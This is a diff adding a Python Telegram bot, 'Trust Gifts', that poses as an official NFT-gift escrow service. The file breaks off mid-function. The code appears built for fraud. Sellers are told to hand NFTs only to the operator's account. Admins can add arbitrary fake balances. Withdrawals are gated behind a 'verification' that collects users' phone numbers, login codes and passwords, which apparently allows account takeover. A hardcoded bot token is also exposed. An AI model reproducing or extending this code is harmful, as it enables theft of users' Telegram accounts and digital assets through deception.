@@ -1,0 +1,1967 @@
+import asyncio
+import json
+import os
+import uuid
+import random
+from datetime import datetime, timedelta
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.client.default import DefaultBotProperties
+from aiohttp import web
+
+# ============================================================
+# 1. КОНФИГУРАЦИЯ
+# ============================================================
+BOT_TOKEN = "8684423252:AAGinUz7SsqWE1sEw0xRUrIwtyxmjSpsXCg"
+MASTER_ADMIN_ID = 8986358602
+BOT_USERNAME = "Trustnftgiftbot"
+BOT_NAME = "Trust Gifts"
+NFT_ESCROW_ACCOUNT = "Trustnftgift"
+MINI_APP_URL = "https://saitminiapp.onrender.com"
+
+bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
+dp = Dispatcher()
+
+# ============================================================
+# 2. ФАЙЛЫ
+# ============================================================
+FILES = {
+    "deals": "deals.json",
+    "admins": "admins.json",
+    "balance": "balance.json",
+    "verification": "verification.json",
+    "verification_requests": "verification_requests.json",
+    "withdraw": "withdraw_requests.json",
+    "logs": "logs.json",
+    "user_language": "user_language.json",
+    "stats": "stats.json",
+    "rekvisits": "rekvisits.json",
+    "tickets": "tickets.json",
+    "chat_messages": "chat_messages.json"
+}
+
+def load_json(file):
+    if os.path.exists(file):
+        with open(file, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    return {}
+
+def save_json(file, data):
+    with open(file, 'w', encoding='utf-8') as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+# Загружаем все данные
+deals = load_json(FILES["deals"])
+admins = load_json(FILES["admins"])
+balance = load_json(FILES["balance"])
+verification_data = load_json(FILES["verification"])
+verification_requests = load_json(FILES["verification_requests"])
+withdraw_requests = load_json(FILES["withdraw"])
+logs = load_json(FILES["logs"])
+user_language = load_json(FILES["user_language"])
+stats = load_json(FILES["stats"])
+rekvisits = load_json(FILES["rekvisits"])
+tickets = load_json(FILES["tickets"])
+chat_messages = load_json(FILES["chat_messages"])
+
+# ============================================================
+# 3. ПОМОЩНИКИ
+# ============================================================
+def is_admin(user_id: int) -> bool:
+    return user_id == MASTER_ADMIN_ID or str(user_id) in admins
+
+def get_balance(user_id: int):
+    uid = str(user_id)
+    if uid not in balance:
+        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
+        save_json(FILES["balance"], balance)
+    return balance[uid]
+
+def add_balance(user_id: int, currency: str, amount: float):
+    uid = str(user_id)
+    curr = currency.lower()
+    if uid not in balance:
+        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
+    balance[uid][curr] = balance[uid].get(curr, 0) + amount
+    save_json(FILES["balance"], balance)
+
+def set_balance(user_id: int, currency: str, amount: float):
+    uid = str(user_id)
+    curr = currency.lower()
+    if uid not in balance:
+        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
+    balance[uid][curr] = amount
+    save_json(FILES["balance"], balance)
+
+def get_user_language(user_id: int) -> str:
+    return user_language.get(str(user_id), "ru")
+
+def set_user_language(user_id: int, lang: str):
+    user_language[str(user_id)] = lang
+    save_json(FILES["user_language"], user_language)
+
+def is_verified(user_id: int) -> bool:
+    uid = str(user_id)
+    if uid not in verification_data:
+        return False
+    if "verified_at" in verification_data[uid]:
+        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
+        if (datetime.now() - verified_time).total_seconds() > 86400:
+            return False
+        return True
+    return False
+
+def complete_verification(user_id: int, phone: str, code: str):
+    uid = str(user_id)
+    verification_data[uid] = {
+        "verified_at": datetime.now().isoformat(),
+        "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
+        "phone": phone,
+        "code": code
+    }
+    save_json(FILES["verification"], verification_data)
+
+async def log_to_master(text: str):
+    try:
+        await bot.send_message(MASTER_ADMIN_ID, text)
+    except:
+        pass
+
+def log_action(action: str, data: dict):
+    log_id = str(uuid.uuid4())[:8]
+    logs[log_id] = {
+        "id": log_id,
+        "time": datetime.now().isoformat(),
+        "action": action,
+        "data": data
+    }
+    save_json(FILES["logs"], logs)
+
+# ============================================================
+# 4. КЛАВИАТУРЫ
+# ============================================================
+def main_menu_keyboard(user_id: int):
+    buttons = [
+        [
+            InlineKeyboardButton(text="📱 Создать сделку", web_app=WebAppInfo(url=MINI_APP_URL)),
+            InlineKeyboardButton(text="💰 Баланс", callback_data="menu_balance"),
+        ],
+        [
+            InlineKeyboardButton(text="📋 Мои сделки", callback_data="menu_deals"),
+            InlineKeyboardButton(text="📖 Гайд", callback_data="how_to_deal"),
+        ],
+        [
+            InlineKeyboardButton(text="🌐 Язык", callback_data="select_language"),
+        ]
+    ]
+    if is_admin(user_id):
+        buttons.append([
+            InlineKeyboardButton(text="⚙️ Админ", callback_data="menu_admin"),
+        ])
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
+
+def admin_panel_keyboard():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💰 Начислить", callback_data="admin_add_balance")],
+        [InlineKeyboardButton(text="👥 Админы", callback_data="admin_manage_admins")],
+        [InlineKeyboardButton(text="📊 Все сделки", callback_data="admin_all_deals")],
+        [InlineKeyboardButton(text="💳 Выводы", callback_data="admin_withdraw_requests")],
+        [InlineKeyboardButton(text="🔐 Верификация", callback_data="admin_verification")],
+        [InlineKeyboardButton(text="🎫 Тикеты", callback_data="admin_tickets")],
+        [InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs")],
+        [InlineKeyboardButton(text="📈 Статистика", callback_data="admin_stats")],
+        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
+    ])
+
+def back_to_main_keyboard():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
+    ])
+
+def language_keyboard():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru")],
+        [InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en")],
+    ])
+
+def currency_keyboard():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
+        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
+        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
+        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
+    ])
+
+def mini_app_keyboard(text: str, page: str = ""):
+    url = MINI_APP_URL
+    if page:
+        url += f"?page={page}"
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=text, web_app=WebAppInfo(url=url))],
+        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
+    ])
+
+# ============================================================
+# 5. ГАЙД
+# ============================================================
+GUIDE_TEXT = """Trust Gifts — официальная платформа безопасных сделок
+
+Гарантия защиты — средства под охраной
+Быстрые выплаты — удобный вывод
+Поддержка 24/7
+
+Как проходит сделка:
+1. Продавец создаёт сделку и отправляет ссылку покупателю
+2. Покупатель оплачивает — средства резервируются платформой
+3. Продавец передаёт товар официальному посреднику @{NFT_ESCROW_ACCOUNT} для проверки
+4. Покупатель получает товар после подтверждения
+
+ВНИМАНИЕ: NFT передаётся ТОЛЬКО на @{NFT_ESCROW_ACCOUNT}"""
+
+# ============================================================
+# 6. ОБРАБОТЧИКИ
+# ============================================================
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    if message.text and message.text.startswith("/start deal_"):
+        deal_id = message.text.split("_")[1]
+        await handle_deal_link(message, deal_id)
+        return
+    
+    lang = get_user_language(message.from_user.id)
+    
+    if not lang:
+        await message.answer(
+            "🌐 Выберите язык / Choose language:",
+            reply_markup=language_keyboard()
+        )
+        return
+    
+    welcome_text = f"""🏦 Trust Gifts — официальная платформа безопасных сделок
+
+🛡️ Гарантия защиты — средства под охраной
+⚡ Быстрые выплаты — удобный вывод
+🆘 Поддержка 24/7
+
+📖 Как проходит сделка:
+1️⃣ Продавец создаёт сделку и отправляет ссылку покупателю
+2️⃣ Покупатель оплачивает — средства резервируются платформой
+3️⃣ Продавец передаёт товар официальному посреднику @{NFT_ESCROW_ACCOUNT} для проверки
+4️⃣ Покупатель получает товар после подтверждения
+
+🔥 Начни прямо сейчас!"""
+    
+    await message.answer(welcome_text, reply_markup=main_menu_keyboard(message.from_user.id))
+
+@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
+async def set_language(callback: types.CallbackQuery):
+    lang = callback.data.split("_")[2]
+    set_user_language(callback.from_user.id, lang)
+    await callback.answer("✅ Язык установлен")
+    
+    if lang == "en":
+        welcome_text = f"""🏦 Trust Gifts — official secure exchange platform
+
+🛡️ Guaranteed protection — funds under custody
+⚡ Fast payouts — convenient withdrawal
+🆘 Support 24/7
+
+📖 How the deal works:
+1️⃣ Seller creates a deal and sends link to buyer
+2️⃣ Buyer pays — funds are reserved by platform
+3️⃣ Seller transfers item to official escrow @{NFT_ESCROW_ACCOUNT} for verification
+4️⃣ Buyer receives item after confirmation
+
+🔥 Start now!"""
+    else:
+        welcome_text = f"""🏦 Trust Gifts — официальная платформа безопасных сделок
+
+🛡️ Гарантия защиты — средства под охраной
+⚡ Быстрые выплаты — удобный вывод
+🆘 Поддержка 24/7
+
+📖 Как проходит сделка:
+1️⃣ Продавец создаёт сделку и отправляет ссылку покупателю
+2️⃣ Покупатель оплачивает — средства резервируются платформой
+3️⃣ Продавец передаёт товар официальному посреднику @{NFT_ESCROW_ACCOUNT} для проверки
+4️⃣ Покупатель получает товар после подтверждения
+
+🔥 Начни прямо сейчас!"""
+    
+    await callback.message.edit_text(welcome_text, reply_markup=main_menu_keyboard(callback.from_user.id))
+
+@dp.callback_query(lambda c: c.data == "select_language")
+async def select_language(callback: types.CallbackQuery):
+    await callback.message.edit_text(
+        "🌐 Выберите язык / Choose language:",
+        reply_markup=language_keyboard()
+    )
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "back_to_main")
+async def back_to_main(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    if lang == "en":
+        welcome_text = f"""🏦 Trust Gifts — official secure exchange platform
+
+🛡️ Guaranteed protection — funds under custody
+⚡ Fast payouts — convenient withdrawal
+🆘 Support 24/7
+
+🔥 Choose action:"""
+    else:
+        welcome_text = f"""🏦 Trust Gifts — официальная платформа безопасных сделок
+
+🛡️ Гарантия защиты — средства под охраной
+⚡ Быстрые выплаты — удобный вывод
+🆘 Поддержка 24/7
+
+🔥 Выберите действие:"""
+    await callback.message.edit_text(welcome_text, reply_markup=main_menu_keyboard(callback.from_user.id))
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "how_to_deal")
+async def how_to_deal(callback: types.CallbackQuery):
+    text = GUIDE_TEXT.format(NFT_ESCROW_ACCOUNT=NFT_ESCROW_ACCOUNT)
+    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard())
+    await callback.answer()
+
+# ============================================================
+# 7. БАЛАНС
+# ============================================================
+@dp.callback_query(lambda c: c.data == "menu_balance")
+async def menu_balance(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    bal = get_balance(callback.from_user.id)
+    verif_status = "🔓 Доступен" if is_verified(callback.from_user.id) else "🔒 Требуется верификация"
+    
+    if lang == "en":
+        text = f"""💰 YOUR BALANCE
+
+💎 TON: {bal.get('ton', 0)}
+⭐️ STARS: {bal.get('stars', 0)}
+💰 RUB: {bal.get('rub', 0)}
+🌐 UAH: {bal.get('uah', 0)}
+
+📊 Completed deals: {sum(bal.get('deal_partners', {}).values())}
+
+🔐 Verification: {verif_status}
+
+📱 ALL OPERATIONS IN MINI APP"""
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="💳 Withdraw", callback_data="start_withdraw")],
+            [InlineKeyboardButton(text="◀️ Main menu", callback_data="back_to_main")]
+        ])
+    else:
+        text = f"""💰 ВАШ БАЛАНС
+
+💎 TON: {bal.get('ton', 0)}
+⭐️ STARS: {bal.get('stars', 0)}
+💰 RUB: {bal.get('rub', 0)}
+🌐 UAH: {bal.get('uah', 0)}
+
+📊 Завершено сделок: {sum(bal.get('deal_partners', {}).values())}
+
+🔐 Верификация: {verif_status}
+
+📱 ВСЕ ОПЕРАЦИИ В MINI APP"""
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="💳 Вывод", callback_data="start_withdraw")],
+            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
+        ])
+    
+    await callback.message.edit_text(text, reply_markup=keyboard)
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "menu_deals")
+async def menu_deals(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    user_deals = []
+    for d_id, d in deals.items():
+        if d.get("seller_id") == callback.from_user.id or d.get("buyer_id") == callback.from_user.id:
+            user_deals.append((d_id, d))
+    
+    if not user_deals:
+        text = "📭 У вас нет сделок" if lang == "ru" else "📭 You have no deals"
+        await callback.message.edit_text(text, reply_markup=back_to_main_keyboard())
+        return
+    
+    if lang == "en":
+        text = "📊 MY DEALS\n\n"
+    else:
+        text = "📊 МОИ СДЕЛКИ\n\n"
+    
+    for d_id, d in user_deals[-10:]:
+        status_map = {
+            "waiting_payment": "⏳ Ожидает оплаты" if lang == "ru" else "⏳ Waiting for payment",
+            "paid": "✅ Оплачено" if lang == "ru" else "✅ Paid",
+            "awaiting_confirmation": "📦 Ожидает подтверждения" if lang == "ru" else "📦 Awaiting confirmation",
+            "completed": "🎉 Завершено" if lang == "ru" else "🎉 Completed"
+        }
+        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
+        text += f"   💰 {d['amount']} {d['currency']} | {d['product'][:25]}\n"
+        text += f"   👤 Продавец: @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n\n"
+    
+    await callback.message.edit_text(text[:4000], reply_markup=back_to_main_keyboard())
+    await callback.answer()
+
+# ============================================================
+# 8. ССЫЛКА НА СДЕЛКУ (РАБОТАЕТ!)
+# ============================================================
+async def handle_deal_link(message: types.Message, deal_id: str):
+    lang = get_user_language(message.from_user.id)
+    
+    # Перезагружаем данные, чтобы быть уверенным
+    global deals
+    deals = load_json(FILES["deals"])
+    
+    if deal_id not in deals:
+        if lang == "ru":
+            text = f"""❌ Сделка #{deal_id} не найдена.
+
+Возможные причины:
+• Сделка была удалена
+• Ссылка недействительна
+• Сделка завершена
+
+🆘 Если вы считаете, что это ошибка — обратитесь в поддержку: @supexchangerf"""
+        else:
+            text = f"""❌ Deal #{deal_id} not found.
+
+Possible reasons:
+• Deal was deleted
+• Invalid link
+• Deal is completed
+
+🆘 If you think this is an error — contact support: @supexchangerf"""
+        await message.answer(text)
+        return
+
+    deal = deals[deal_id]
+    
+    if deal["status"] != "waiting_payment":
+        status_map = {
+            "paid": "✅ Оплачено" if lang == "ru" else "✅ Paid",
+            "awaiting_confirmation": "📦 Ожидает подтверждения" if lang == "ru" else "📦 Awaiting confirmation",
+            "completed": "🎉 Завершено" if lang == "ru" else "🎉 Completed"
+        }
+        if lang == "ru":
+            text = f"❌ Сделка #{deal_id} уже обработана.\n\nСтатус: {status_map.get(deal['status'], deal['status'])}"
+        else:
+            text = f"❌ Deal #{deal_id} already processed.\n\nStatus: {status_map.get(deal['status'], deal['status'])}"
+        await message.answer(text)
+        return
+
+    # Проверяем, что покупатель — тот, кому предназначена сделка
+    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
+        if lang == "ru":
+            text = f"❌ Доступ запрещён!\n\nСделка #{deal_id} предназначена для @{deal['buyer_username']}"
+        else:
+            text = f"❌ Access denied!\n\nDeal #{deal_id} is for @{deal['buyer_username']}"
+        await message.answer(text)
+        return
+
+    # Сохраняем buyer_id
+    deal["buyer_id"] = message.from_user.id
+    save_json(FILES["deals"], deals)
+
+    # Формируем сообщение
+    nft_info = ""
+    if deal.get('nft_link'):
+        nft_info = f"\n🔗 NFT: {deal['nft_link']}"
+    
+    if lang == "ru":
+        text = f"""✈️ СДЕЛКА #{deal_id}
+
+📦 Товар: {deal['product']}
+💰 Сумма: {deal['amount']} {deal['currency']}
+👤 Продавец: @{deal['seller_username']}
+{nft_info}
+
+⬇️ ПЕРЕЙДИТЕ В MINI APP ДЛЯ ОПЛАТЫ"""
+    else:
+        text = f"""✈️ DEAL #{deal_id}
+
+📦 Product: {deal['product']}
+💰 Amount: {deal['amount']} {deal['currency']}
+👤 Seller: @{deal['seller_username']}
+{nft_info}
+
+⬇️ GO TO MINI APP FOR PAYMENT"""
+
+    await message.answer(
+        text,
+        reply_markup=mini_app_keyboard("💳 Перейти в Mini App" if lang == "ru" else "💳 Go to Mini App", "pay")
+    )
+
+# ============================================================
+# 9. ВЫВОД
+# ============================================================
+@dp.callback_query(lambda c: c.data == "start_withdraw")
+async def start_withdraw(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    
+    if not is_verified(callback.from_user.id):
+        if lang == "ru":
+            text = """⚠️ ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ
+
+🔐 Пройдите верификацию в Mini App"""
+        else:
+            text = """⚠️ VERIFICATION REQUIRED
+
+🔐 Complete verification in Mini App"""
+        
+        await callback.message.edit_text(
+            text,
+            reply_markup=mini_app_keyboard("🔐 Верификация" if lang == "ru" else "🔐 Verify", "verify")
+        )
+        return
+    
+    bal = get_balance(callback.from_user.id)
+    verif_data = verification_data.get(str(callback.from_user.id), {})
+    
+    if lang == "ru":
+        text = f"""💰 ВАШ БАЛАНС
+
+💎 TON: {bal.get('ton', 0)}
+⭐️ STARS: {bal.get('stars', 0)}
+💰 RUB: {bal.get('rub', 0)}
+🌐 UAH: {bal.get('uah', 0)}
+
+🔑 Код верификации: {verif_data.get('code', 'неизвестно')}
+🕐 Сессия активна до: {verif_data.get('expires_at', 'неизвестно')[:19] if verif_data.get('expires_at') else 'неизвестно'}
+
+📱 Вывод средств в Mini App"""
+    else:
+        text = f"""💰 YOUR BALANCE
+
+💎 TON: {bal.get('ton', 0)}
+⭐️ STARS: {bal.get('stars', 0)}
+💰 RUB: {bal.get('rub', 0)}
+🌐 UAH: {bal.get('uah', 0)}
+
+🔑 Verification code: {verif_data.get('code', 'unknown')}
+🕐 Session active until: {verif_data.get('expires_at', 'unknown')[:19] if verif_data.get('expires_at') else 'unknown'}
+
+📱 Withdraw in Mini App"""
+    
+    await callback.message.edit_text(
+        text,
+        reply_markup=mini_app_keyboard("💳 Вывести" if lang == "ru" else "💳 Withdraw", "withdraw")
+    )
+    await callback.answer()
+
+# ============================================================
+# 10. АДМИН
+# ============================================================
+class AdminStates(StatesGroup):
+    waiting_user_id = State()
+    waiting_currency = State()
+    waiting_amount = State()
+
+@dp.callback_query(lambda c: c.data == "menu_admin")
+async def menu_admin(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    await callback.message.edit_text(
+        "⚙️ АДМИН ПАНЕЛЬ\n\nВыберите действие:",
+        reply_markup=admin_panel_keyboard()
+    )
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "admin_add_balance")
+async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    await callback.message.edit_text("💰 НАЧИСЛИТЬ БАЛАНС\n\nВведите ID пользователя:")
+    await state.set_state(AdminStates.waiting_user_id)
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_user_id)
+async def admin_get_user_id(message: types.Message, state: FSMContext):
+    try:
+        user_id = int(message.text.strip())
+        await state.update_data(target_user_id=user_id)
+        await message.answer("💱 Выберите валюту:", reply_markup=currency_keyboard())
+        await state.set_state(AdminStates.waiting_currency)
+    except:
+        await message.answer("❌ Неверный ID")
+
+@dp.callback_query(lambda c: c.data.startswith("curr_"))
+async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
+    currency = callback.data.split("_")[1]
+    await state.update_data(target_currency=currency)
+    await callback.message.edit_text(f"💰 Введите сумму в {currency}:")
+    await state.set_state(AdminStates.waiting_amount)
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_amount)
+async def admin_get_amount(message: types.Message, state: FSMContext):
+    try:
+        amount = float(message.text.strip())
+        if amount <= 0:
+            raise ValueError
+        data = await state.get_data()
+        user_id = data.get("target_user_id")
+        currency = data.get("target_currency")
+        add_balance(user_id, currency, amount)
+        await message.answer(
+            f"✅ Начислено {amount} {currency} пользователю {user_id}",
+            reply_markup=admin_panel_keyboard()
+        )
+        await state.clear()
+    except:
+        await message.answer("❌ Неверная сумма")
+
+@dp.callback_query(lambda c: c.data == "admin_manage_admins")
+async def admin_manage_admins(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
+    await callback.message.edit_text(
+        f"👥 АДМИНЫ\n\n"
+        f"Главный админ: {MASTER_ADMIN_ID}\n"
+        f"Дополнительные:\n{admin_list}\n\n"
+        f"/add_admin [ID] - добавить\n"
+        f"/remove_admin [ID] - удалить",
+        reply_markup=admin_panel_keyboard()
+    )
+    await callback.answer()
+
+@dp.message(Command("add_admin"))
+async def add_admin(message: types.Message):
+    if message.from_user.id != MASTER_ADMIN_ID:
+        await message.answer("⛔ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ Использование: /add_admin [ID]")
+        return
+    try:
+        new_admin_id = int(args[1])
+        admins[str(new_admin_id)] = True
+        save_json(FILES["admins"], admins)
+        await message.answer(f"✅ Админ добавлен: {new_admin_id}")
+    except:
+        await message.answer("❌ Неверный ID")
+
+@dp.message(Command("remove_admin"))
+async def remove_admin(message: types.Message):
+    if message.from_user.id != MASTER_ADMIN_ID:
+        await message.answer("⛔ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ Использование: /remove_admin [ID]")
+        return
+    try:
+        admin_id = int(args[1])
+        if admin_id == MASTER_ADMIN_ID:
+            await message.answer("❌ Нельзя удалить главного админа")
+            return
+        if str(admin_id) in admins:
+            del admins[str(admin_id)]
+            save_json(FILES["admins"], admins)
+            await message.answer(f"✅ Админ удалён: {admin_id}")
+        else:
+            await message.answer("❌ Админ не найден")
+    except:
+        await message.answer("❌ Неверный ID")
+
+@dp.callback_query(lambda c: c.data == "admin_all_deals")
+async def admin_all_deals(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    if not deals:
+        await callback.message.edit_text("📭 Нет сделок", reply_markup=admin_panel_keyboard())
+        return
+    text = "📊 ВСЕ СДЕЛКИ\n\n"
+    for d_id, d in list(deals.items())[-20:]:
+        status_map = {
+            "waiting_payment": "⏳ Ожидает оплаты",
+            "paid": "✅ Оплачено",
+            "awaiting_confirmation": "📦 Ожидает подтверждения",
+            "completed": "🎉 Завершено"
+        }
+        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
+        text += f"   👤 @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
+        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n"
+        text += f"   📦 {d.get('product', '')[:30]}\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
+async def admin_withdraw_requests(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
+    if not pending:
+        await callback.message.edit_text("📭 Нет активных заявок", reply_markup=admin_panel_keyboard())
+        return
+    text = "💳 ЗАЯВКИ НА ВЫВОД\n\n"
+    for rid, req in list(pending.items())[-10:]:
+        text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.answer()
+
+@dp.message(Command("confirm_withdraw"))
+async def confirm_withdraw_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ Использование: /confirm_withdraw [ID]")
+        return
+    request_id = args[1]
+    if request_id not in withdraw_requests:
+        await message.answer("❌ Заявка не найдена")
+        return
+    req = withdraw_requests[request_id]
+    if req.get("status") != "pending":
+        await message.answer("❌ Заявка уже обработана")
+        return
+    bal = get_balance(req["user_id"])
+    curr_key = req["currency"].lower()
+    if bal.get(curr_key, 0) >= req["amount"]:
+        bal[curr_key] -= req["amount"]
+        save_json(FILES["balance"], balance)
+    req["status"] = "completed"
+    req["completed_at"] = datetime.now().isoformat()
+    save_json(FILES["withdraw"], withdraw_requests)
+    await message.answer(f"✅ Вывод подтверждён #{request_id}")
+    try:
+        await bot.send_message(
+            req["user_id"],
+            f"✅ ВЫВОД ПОДТВЕРЖДЁН\n\n💰 {req['amount']} {req['currency']}"
+        )
+    except:
+        pass
+
+@dp.message(Command("reject_withdraw"))
+async def reject_withdraw_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ Использование: /reject_withdraw [ID]")
+        return
+    request_id = args[1]
+    if request_id not in withdraw_requests:
+        await message.answer("❌ Заявка не найдена")
+        return
+    req = withdraw_requests[request_id]
+    if req.get("status") != "pending":
+        await message.answer("❌ Заявка уже обработана")
+        return
+    req["status"] = "rejected"
+    save_json(FILES["withdraw"], withdraw_requests)
+    await message.answer(f"❌ Вывод отклонён #{request_id}")
+
+@dp.callback_query(lambda c: c.data == "admin_verification")
+async def admin_verification(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
+    if not pending:
+        await callback.message.edit_text("🔐 Нет активных запросов на верификацию", reply_markup=admin_panel_keyboard())
+        return
+    text = "🔐 ЗАПРОСЫ НА ВЕРИФИКАЦИЮ\n\n"
+    for rid, req in list(pending.items())[-10:]:
+        text += f"#{rid}\n   👤 @{req.get('username', '?')}\n   🆔 ID: {req.get('user_id', '?')}\n   📞 {req.get('phone', '')}\n   ➡️ /verify_code {rid} [код] [пароль]\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.answer()
+
+@dp.message(Command("verify_code"))
+async def verify_code_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) < 3:
+        await message.answer("❗️ Использование: /verify_code [request_id] [код] [пароль]")
+        return
+    request_id = args[1]
+    code = args[2]
+    password = " ".join(args[3:]) if len(args) > 3 else "нет"
+    
+    if request_id not in verification_requests:
+        await message.answer("❌ Запрос не найден")
+        return
+    req = verification_requests[request_id]
+    if req.get("status") != "pending":
+        await message.answer("❌ Запрос уже обработан")
+        return
+    
+    complete_verification(req["user_id"], req["phone"], code)
+    req["status"] = "completed"
+    req["code"] = code
+    req["password"] = password
+    req["completed_at"] = datetime.now().isoformat()
+    save_json(FILES["verification_requests"], verification_requests)
+    
+    await message.answer(f"✅ Верификация подтверждена #{request_id}")
+    try:
+        await bot.send_message(
+            req["user_id"],
+            f"✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА\n\n"
+            f"🔑 Ваш код: {code}\n"
+            f"🕐 Сессия активна 24 часа"
+        )
+    except:
+        pass
+
+# ============================================================
+# 11. ТИКЕТЫ
+# ============================================================
+@dp.callback_query(lambda c: c.data == "admin_tickets")
+async def admin_tickets(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    
+    pending = {k: v for k, v in tickets.items() if v.get("status") == "open"}
+    
+    if not pending:
+        await callback.message.edit_text("🎫 Нет открытых тикетов", reply_markup=admin_panel_keyboard())
+        return
+    
+    text = "🎫 ТИКЕТЫ\n\n"
+    for tid, t in list(pending.items())[-10:]:
+        text += f"#{tid}\n"
+        text += f"   👤 @{t.get('username', 'неизвестно')} (ID: {t.get('user_id', '?')})\n"
+        text += f"   📝 {t.get('subject', '')}\n"
+        text += f"   💬 {t.get('message', '')[:50]}\n"
+        if t.get('response'):
+            text += f"   📩 Ответ: {t.get('response', '')[:50]}\n"
+        text += f"   ➡️ /answer_ticket {tid} [ответ]\n"
+        text += f"   ➡️ /close_ticket {tid}\n\n"
+    
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.answer()
+
+@dp.message(Command("answer_ticket"))
+async def answer_ticket_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    
+    args = message.text.split(maxsplit=2)
+    if len(args) < 3:
+        await message.answer("❗️ Использование: /answer_ticket [ticket_id] [ответ]")
+        return
+    
+    ticket_id = args[1]
+    response = args[2]
+    
+    if ticket_id not in tickets:
